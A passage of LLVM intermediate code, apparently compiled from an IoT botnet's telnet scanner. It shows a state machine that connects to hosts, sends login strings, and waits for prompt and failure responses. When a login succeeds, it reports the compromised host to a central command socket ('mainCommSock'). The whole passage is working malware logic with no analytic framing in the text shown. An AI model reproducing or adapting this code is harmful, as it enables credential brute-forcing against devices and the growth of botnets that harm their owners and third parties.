  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 16
  %145 = load i32, i32* %2, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %146
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %147, i32 0, i32 0
  %149 = load i32, i32* %148, align 16
  %150 = call i32 (i32, i32, ...) @fcntl(i32 %149, i32 3, i8* null)
  %151 = or i32 %150, 2048
  %152 = call i32 (i32, i32, ...) @fcntl(i32 %144, i32 4, i32 %151)
  %153 = load i32, i32* %2, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %154
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %155, i32 0, i32 0
  %157 = load i32, i32* %156, align 16
  %158 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %159 = call i32 @connect(i32 %157, %struct.sockaddr* %158, i32 16)
  %160 = icmp eq i32 %159, -1
  br i1 %160, label %161, label %176

; <label>:161:                                    ; preds = %139
  %162 = call i32* @__errno_location() #13
  %163 = load i32, i32* %162, align 4
  %164 = icmp ne i32 %163, 115
  br i1 %164, label %165, label %176

; <label>:165:                                    ; preds = %161
  %166 = load i32, i32* %2, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %167
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %168, i32 0, i32 0
  %170 = load i32, i32* %169, align 16
  %171 = call i32 @sclose(i32 %170)
  %172 = load i32, i32* %2, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 3
  store i8 1, i8* %175, align 1
  br label %185

; <label>:176:                                    ; preds = %161, %139
  %177 = load i32, i32* %2, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %178
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %179, i32 0, i32 2
  store i8 1, i8* %180, align 8
  %181 = load i32, i32* %2, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %182
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %183, i32 0, i32 7
  store i32 0, i32* %184, align 16
  br label %185

; <label>:185:                                    ; preds = %176, %165
  br label %695

; <label>:186:                                    ; preds = %79
  br label %187

; <label>:187:                                    ; preds = %186
  %188 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %189 = getelementptr inbounds [16 x i64], [16 x i64]* %188, i64 0, i64 0
  %190 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %189) #5, !srcloc !6
  %191 = extractvalue { i64, i64* } %190, 0
  %192 = extractvalue { i64, i64* } %190, 1
  %193 = trunc i64 %191 to i32
  store i32 %193, i32* %17, align 4
  %194 = ptrtoint i64* %192 to i64
  %195 = trunc i64 %194 to i32
  store i32 %195, i32* %18, align 4
  br label %196

; <label>:196:                                    ; preds = %187
  br label %197

; <label>:197:                                    ; preds = %196
  %198 = load i32, i32* %2, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 0
  %202 = load i32, i32* %201, align 16
  %203 = srem i32 %202, 64
  %204 = zext i32 %203 to i64
  %205 = shl i64 1, %204
  %206 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %207 = load i32, i32* %2, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %208
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 16
  %212 = sdiv i32 %211, 64
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds [16 x i64], [16 x i64]* %206, i64 0, i64 %213
  %215 = load i64, i64* %214, align 8
  %216 = or i64 %215, %205
  store i64 %216, i64* %214, align 8
  %217 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 0, i64* %217, align 8
  %218 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 10000, i64* %218, align 8
  %219 = load i32, i32* %2, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 16
  %224 = add nsw i32 %223, 1
  %225 = call i32 @select(i32 %224, %struct.__sigset_t* null, %struct.__sigset_t* %9, %struct.__sigset_t* null, %struct.timeval* %10)
  store i32 %225, i32* %3, align 4
  %226 = load i32, i32* %3, align 4
  %227 = icmp eq i32 %226, 1
  br i1 %227, label %228, label %285

; <label>:228:                                    ; preds = %197
  store i32 4, i32* %11, align 4
  store i32 0, i32* %5, align 4
  %229 = load i32, i32* %2, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %230
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 16
  %234 = bitcast i32* %5 to i8*
  %235 = call i32 @getsockopt(i32 %233, i32 1, i32 4, i8* %234, i32* %11) #5
  %236 = load i32, i32* %5, align 4
  %237 = icmp ne i32 %236, 0
  br i1 %237, label %238, label %253

; <label>:238:                                    ; preds = %228
  %239 = load i32, i32* %2, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %240
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %241, i32 0, i32 0
  %243 = load i32, i32* %242, align 16
  %244 = call i32 @sclose(i32 %243)
  %245 = load i32, i32* %2, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %246
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %247, i32 0, i32 2
  store i8 0, i8* %248, align 8
  %249 = load i32, i32* %2, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %250
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %251, i32 0, i32 3
  store i8 1, i8* %252, align 1
  br label %284

; <label>:253:                                    ; preds = %228
  %254 = load i32, i32* %2, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %255
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 16
  %259 = load i32, i32* %2, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %260
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %261, i32 0, i32 0
  %263 = load i32, i32* %262, align 16
  %264 = call i32 (i32, i32, ...) @fcntl(i32 %263, i32 3, i8* null)
  %265 = and i32 %264, -2049
  %266 = call i32 (i32, i32, ...) @fcntl(i32 %258, i32 4, i32 %265)
  %267 = load i32, i32* %2, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %268
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %269, i32 0, i32 7
  store i32 0, i32* %270, align 16
  %271 = load i32, i32* %2, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %272
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %273, i32 0, i32 8
  store i16 0, i16* %274, align 4
  %275 = load i32, i32* %2, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %276
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %277, i32 0, i32 9
  %279 = load i8*, i8** %278, align 8
  call void @llvm.memset.p0i8.i64(i8* %279, i8 0, i64 512, i32 1, i1 false)
  %280 = load i32, i32* %2, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %281
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %282, i32 0, i32 2
  store i8 2, i8* %283, align 8
  br label %284

; <label>:284:                                    ; preds = %253, %238
  br label %696

; <label>:285:                                    ; preds = %197
  %286 = load i32, i32* %3, align 4
  %287 = icmp eq i32 %286, -1
  br i1 %287, label %288, label %303

; <label>:288:                                    ; preds = %285
  %289 = load i32, i32* %2, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %290
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %291, i32 0, i32 0
  %293 = load i32, i32* %292, align 16
  %294 = call i32 @sclose(i32 %293)
  %295 = load i32, i32* %2, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %296
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %297, i32 0, i32 2
  store i8 0, i8* %298, align 8
  %299 = load i32, i32* %2, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %300
  %302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %301, i32 0, i32 3
  store i8 1, i8* %302, align 1
  br label %696

; <label>:303:                                    ; preds = %285
  br label %304

; <label>:304:                                    ; preds = %303
  %305 = load i32, i32* %2, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %306
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %307, i32 0, i32 7
  %309 = load i32, i32* %308, align 16
  %310 = add i32 %309, 6
  %311 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %312 = icmp ult i32 %310, %311
  br i1 %312, label %313, label %328

; <label>:313:                                    ; preds = %304
  %314 = load i32, i32* %2, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %315
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %316, i32 0, i32 0
  %318 = load i32, i32* %317, align 16
  %319 = call i32 @sclose(i32 %318)
  %320 = load i32, i32* %2, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 2
  store i8 0, i8* %323, align 8
  %324 = load i32, i32* %2, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 3
  store i8 1, i8* %327, align 1
  br label %328

; <label>:328:                                    ; preds = %313, %304
  br label %695

; <label>:329:                                    ; preds = %79
  %330 = load i32, i32* %2, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %331
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %332, i32 0, i32 0
  %334 = load i32, i32* %333, align 16
  %335 = load i32, i32* %2, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %336
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %337, i32 0, i32 9
  %339 = load i8*, i8** %338, align 8
  %340 = call i32 @read_until_response(i32 %334, i32 10000, i8* %339, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %341 = icmp ne i32 %340, 0
  br i1 %341, label %342, label %361

; <label>:342:                                    ; preds = %329
  %343 = load i32, i32* %2, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %344
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %345, i32 0, i32 9
  %347 = load i8*, i8** %346, align 8
  %348 = call i32 @contains_fail(i8* %347)
  %349 = icmp ne i32 %348, 0
  br i1 %349, label %350, label %355

; <label>:350:                                    ; preds = %342
  %351 = load i32, i32* %2, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 2
  store i8 0, i8* %354, align 8
  br label %360

; <label>:355:                                    ; preds = %342
  %356 = load i32, i32* %2, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %358, i32 0, i32 2
  store i8 3, i8* %359, align 8
  br label %360

; <label>:360:                                    ; preds = %355, %350
  br label %696

; <label>:361:                                    ; preds = %329
  %362 = load i32, i32* %2, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %363
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %364, i32 0, i32 7
  %366 = load i32, i32* %365, align 16
  %367 = add i32 %366, 6
  %368 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %369 = icmp ult i32 %367, %368
  br i1 %369, label %370, label %379

; <label>:370:                                    ; preds = %361
  %371 = load i32, i32* %2, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %372
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %373, i32 0, i32 2
  store i8 0, i8* %374, align 8
  %375 = load i32, i32* %2, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %376
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %377, i32 0, i32 3
  store i8 1, i8* %378, align 1
  br label %379

; <label>:379:                                    ; preds = %370, %361
  br label %695

; <label>:380:                                    ; preds = %79
  %381 = load i32, i32* %2, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %382
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %383, i32 0, i32 0
  %385 = load i32, i32* %384, align 16
  %386 = call i64 @send(i32 %385, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.303, i32 0, i32 0), i64 7, i32 16384)
  %387 = icmp slt i64 %386, 0
  br i1 %387, label %388, label %397

; <label>:388:                                    ; preds = %380
  %389 = load i32, i32* %2, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %390
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %391, i32 0, i32 2
  store i8 0, i8* %392, align 8
  %393 = load i32, i32* %2, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %394
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %395, i32 0, i32 3
  store i8 1, i8* %396, align 1
  br label %696

; <label>:397:                                    ; preds = %380
  %398 = load i32, i32* %2, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %399
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %400, i32 0, i32 2
  store i8 4, i8* %401, align 8
  br label %695

; <label>:402:                                    ; preds = %79
  %403 = load i32, i32* %2, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %404
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %405, i32 0, i32 0
  %407 = load i32, i32* %406, align 16
  %408 = load i32, i32* %2, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %409
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %410, i32 0, i32 9
  %412 = load i8*, i8** %411, align 8
  %413 = call i32 @read_until_response(i32 %407, i32 10000, i8* %412, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %414 = icmp ne i32 %413, 0
  br i1 %414, label %415, label %434

; <label>:415:                                    ; preds = %402
  %416 = load i32, i32* %2, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 9
  %420 = load i8*, i8** %419, align 8
  %421 = call i32 @contains_fail(i8* %420)
  %422 = icmp ne i32 %421, 0
  br i1 %422, label %423, label %428

; <label>:423:                                    ; preds = %415
  %424 = load i32, i32* %2, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 2
  store i8 0, i8* %427, align 8
  br label %433

; <label>:428:                                    ; preds = %415
  %429 = load i32, i32* %2, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %430
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %431, i32 0, i32 2
  store i8 5, i8* %432, align 8
  br label %433

; <label>:433:                                    ; preds = %428, %423
  br label %696

; <label>:434:                                    ; preds = %402
  %435 = load i32, i32* %2, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 7
  %439 = load i32, i32* %438, align 16
  %440 = add i32 %439, 6
  %441 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %442 = icmp ult i32 %440, %441
  br i1 %442, label %443, label %452

; <label>:443:                                    ; preds = %434
  %444 = load i32, i32* %2, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %445
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %446, i32 0, i32 2
  store i8 0, i8* %447, align 8
  %448 = load i32, i32* %2, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 3
  store i8 1, i8* %451, align 1
  br label %452

; <label>:452:                                    ; preds = %443, %434
  br label %695

; <label>:453:                                    ; preds = %79
  %454 = load i32, i32* %2, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %455
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %456, i32 0, i32 0
  %458 = load i32, i32* %457, align 16
  %459 = call i64 @send(i32 %458, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.303, i32 0, i32 0), i64 7, i32 16384)
  %460 = icmp slt i64 %459, 0
  br i1 %460, label %461, label %470

; <label>:461:                                    ; preds = %453
  %462 = load i32, i32* %2, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 2
  store i8 0, i8* %465, align 8
  %466 = load i32, i32* %2, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 3
  store i8 1, i8* %469, align 1
  br label %696

; <label>:470:                                    ; preds = %453
  %471 = load i32, i32* %2, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 2
  store i8 6, i8* %474, align 8
  br label %695

; <label>:475:                                    ; preds = %79
  %476 = load i32, i32* %2, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %477
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %478, i32 0, i32 0
  %480 = load i32, i32* %479, align 16
  %481 = load i32, i32* %2, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %482
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %483, i32 0, i32 9
  %485 = load i8*, i8** %484, align 8
  %486 = call i32 @read_until_response(i32 %480, i32 10000, i8* %485, i32 512, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %487 = icmp ne i32 %486, 0
  br i1 %487, label %488, label %518

; <label>:488:                                    ; preds = %475
  %489 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %490 = load i32, i32* %2, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %492, i32 0, i32 7
  store i32 %489, i32* %493, align 16
  %494 = load i32, i32* %2, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 9
  %498 = load i8*, i8** %497, align 8
  %499 = call i32 @contains_fail(i8* %498)
  %500 = icmp ne i32 %499, 0
  br i1 %500, label %501, label %506

; <label>:501:                                    ; preds = %488
  %502 = load i32, i32* %2, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %503
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %504, i32 0, i32 2
  store i8 0, i8* %505, align 8
  br label %517

; <label>:506:                                    ; preds = %488
  %507 = load i32, i32* @mainCommSock, align 4
  %508 = load i32, i32* %2, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %509
  %511 = call i8* @get_telstate_host(%struct.telstate_t* %510)
  %512 = call i32 (i32, i8*, ...) @sockprintf(i32 %507, i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.304, i32 0, i32 0), i8* %511)
  %513 = load i32, i32* %2, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 2
  store i8 7, i8* %516, align 8
  br label %517

; <label>:517:                                    ; preds = %506, %501
  br label %696

; <label>:518:                                    ; preds = %475
  %519 = load i32, i32* %2, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %520
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %521, i32 0, i32 7
  %523 = load i32, i32* %522, align 16
  %524 = add i32 %523, 7
  %525 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %526 = icmp ult i32 %524, %525
  br i1 %526, label %527, label %536

; <label>:527:                                    ; preds = %518
  %528 = load i32, i32* %2, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %529
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %530, i32 0, i32 2
  store i8 0, i8* %531, align 8
  %532 = load i32, i32* %2, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 3
  store i8 1, i8* %535, align 1
  br label %536

; <label>:536:                                    ; preds = %527, %518
  br label %695

; <label>:537:                                    ; preds = %79
  %538 = load i32, i32* %2, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %539
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %540, i32 0, i32 0
  %542 = load i32, i32* %541, align 16
  %543 = call i64 @send(i32 %542, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.305, i32 0, i32 0), i64 4, i32 16384)
  %544 = icmp slt i64 %543, 0
  br i1 %544, label %545, label %554

; <label>:545:                                    ; preds = %537
  %546 = load i32, i32* %2, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %547
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %548, i32 0, i32 2
  store i8 0, i8* %549, align 8
  %550 = load i32, i32* %2, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 3
  store i8 1, i8* %553, align 1
  br label %696

; <label>:554:                                    ; preds = %537
  %555 = load i32, i32* %2, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %556
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %557, i32 0, i32 2
  store i8 8, i8* %558, align 8
  br label %695

; <label>:559:                                    ; preds = %79
  %560 = load i32, i32* %2, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %561
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %562, i32 0, i32 0
  %564 = load i32, i32* %563, align 16
  %565 = load i32, i32* %2, align 4
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %566
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %567, i32 0, i32 9
  %569 = load i8*, i8** %568, align 8
  %570 = call i32 @read_until_response(i32 %564, i32 10000, i8* %569, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %571 = icmp ne i32 %570, 0
  br i1 %571, label %572, label %591

; <label>:572:                                    ; preds = %559
  %573 = load i32, i32* %2, align 4
  %574 = sext i32 %573 to i64
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %574
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %575, i32 0, i32 9
  %577 = load i8*, i8** %576, align 8
  %578 = call i32 @contains_fail(i8* %577)
  %579 = icmp ne i32 %578, 0
  br i1 %579, label %580, label %585

; <label>:580:                                    ; preds = %572
  %581 = load i32, i32* %2, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 2
  store i8 0, i8* %584, align 8
  br label %590

; <label>:585:                                    ; preds = %572
  %586 = load i32, i32* %2, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %587
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %588, i32 0, i32 2
  store i8 9, i8* %589, align 8
  br label %590

; <label>:590:                                    ; preds = %585, %580
  br label %696

; <label>:591:                                    ; preds = %559
  %592 = load i32, i32* %2, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %593
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %594, i32 0, i32 7
  %596 = load i32, i32* %595, align 16
  %597 = add i32 %596, 6
  %598 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %599 = icmp ult i32 %597, %598
  br i1 %599, label %600, label %609

; <label>:600:                                    ; preds = %591
  %601 = load i32, i32* %2, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %602
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %603, i32 0, i32 2
  store i8 0, i8* %604, align 8
  %605 = load i32, i32* %2, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 3
  store i8 1, i8* %608, align 1
  br label %609

